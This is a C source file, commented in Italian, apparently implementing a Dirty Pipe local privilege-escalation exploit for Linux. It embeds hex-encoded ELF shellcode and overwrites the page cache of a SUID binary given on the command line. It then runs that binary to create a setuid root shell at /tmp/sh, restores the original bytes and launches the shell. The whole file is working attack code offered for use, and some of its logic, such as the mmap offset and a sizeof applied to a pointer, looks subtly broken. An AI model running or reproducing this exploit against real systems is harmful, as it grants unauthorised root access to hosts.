/*
*
*codice per Linux
*
*
*/


#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE getpagesize() 
#endif


// questo ELF code corrisponde a:
//   setuid(0);
//   setgid(0);
//   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
// questo ELF code e' per architettura INTEL AMD x86 con Kernel Linux 
unsigned char elfcode[] = {
    /*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
    0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
    0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
    0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
    0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
    0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
    0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
    0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
    0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
    0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
    0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
};

#define ELFCODE_SIZE sizeof(elfcode)


	

void prepara_pipe(int p[2] ){

	uint8_t buffer[PAGE_SIZE]; //4096 Byte (4KB)
	const unsigned pipe_size=fcntl(p[1],F_GETPIPE_SZ); //tipicamente 16 pagine circa. Varia da architettura a architettura
	
	//riempi pipe completamente
	for(int to_write=pipe_size; to_write > 0; to_write-=PAGE_SIZE){

		if(  to_write >= PAGE_SIZE ){
			write(p[1], buffer, PAGE_SIZE);		
		}else{
			write(p[1], buffer, to_write );
		}
	}

	//svuota pipe completamente
	for(int to_read=pipe_size; to_read > 0; to_read-=PAGE_SIZE){

		if(  to_read >= PAGE_SIZE ){
			read(p[0], buffer, PAGE_SIZE);		
		}else{
			read(p[0], buffer, to_read );
		}
	}

}


uint8_t * backup_binary(char * path){

	int fd;
	char *bytes;

	if ( ( fd = open( path, O_RDONLY ) ) < 0 ){
		fprintf(stderr,"[x] Errore nell'apertura file: %s \n",path);
		exit(EXIT_FAILURE);
	}

	bytes = mmap(NULL,ELFCODE_SIZE,PROT_READ, MAP_PRIVATE, fd, 1);
	
    if (close(fd) == -1) {
        perror("Failed to close the file");
        exit(EXIT_FAILURE);
    }

	return bytes;

}


void punta_page_cache(int fd, int p[2]){

	loff_t offset=0;
	int res = splice(fd,&offset,p[1],NULL,1,0); 
	if( res <= 0 ){
		perror(res < 0? "[x] splice non riuscita \n" :  "[x] splice troppo corta \n");
		exit(EXIT_FAILURE);
	}
}

void scrivi_page_cache(int p[2], uint8_t * data){

	ssize_t numwrite;
	
	numwrite = write(p[1],data,ELFCODE_SIZE);
	if(numwrite < ELFCODE_SIZE){
		perror( numwrite == 0 ? "[x] write non riuscita \n" : "[x] write troppo corta \n");
		exit(EXIT_FAILURE);
	}
}



void dirty_pipe(int p[2], char * path, uint8_t * data){

	int fd;
	
	
	if (pipe(p) == -1){
		perror("[x] Problema nella creazione della pipe \n");
		exit(EXIT_FAILURE);
	}

	if (( fd = open( path, O_RDONLY ) ) < 0 ){
		fprintf(stderr,"[x] Errore nell'apertura file: %s \n",path);
		exit(EXIT_FAILURE);
	}


	prepara_pipe(p);
	punta_page_cache(fd,p);
	scrivi_page_cache(p,data);

	close(fd);

}



void main(int argc, char **argv){

	int p[2];
	FILE *pr;
	char *path = argv[1]; //argomento: percorso completo a SUID binary
	uint8_t *orig_bytes;


	if( ELFCODE_SIZE > PAGE_SIZE-2 ){
		fprintf(stderr,"[x] Payload troppo grande (%d Byte. Massimo consentito: %d Byte)\n",ELFCODE_SIZE,PAGE_SIZE-2);
		exit(EXIT_FAILURE);
	}


	if(path == NULL){
		fprintf(stderr,"Uso: %s percorso_SUID_BINARY\n",argv[0]);
		exit(EXIT_FAILURE);
	}


	orig_bytes = backup_binary(path);
	printf("[v] backup SUID binary ( %lu bytes ) \n" , sizeof(orig_bytes));
	if( sizeof(orig_bytes) > ELFCODE_SIZE){
		perror("[x] ELFCODE_SIZE troppo grande per la binary");
		exit(EXIT_FAILURE);
	}


	dirty_pipe(p,path,elfcode);
	printf("[v] codice iniettato \n");


	if ((pr = popen(path,"r")) == NULL){
		perror("[x] esecuzione binary fallita \n");
		exit(EXIT_FAILURE);
	}
	pclose(pr);
	printf("[v] SUID binary eseguita; generazione SUID shell /tmp/sh \n");


	dirty_pipe(p,path,orig_bytes);
	printf("[v] SUID binary restaurata \n");
	printf("\n ricorda di eseguire 'rm /tmp/sh' prima di uscire\n");

	fflush(stdout);
	system("/tmp/sh");
	
	exit(EXIT_SUCCESS);
}



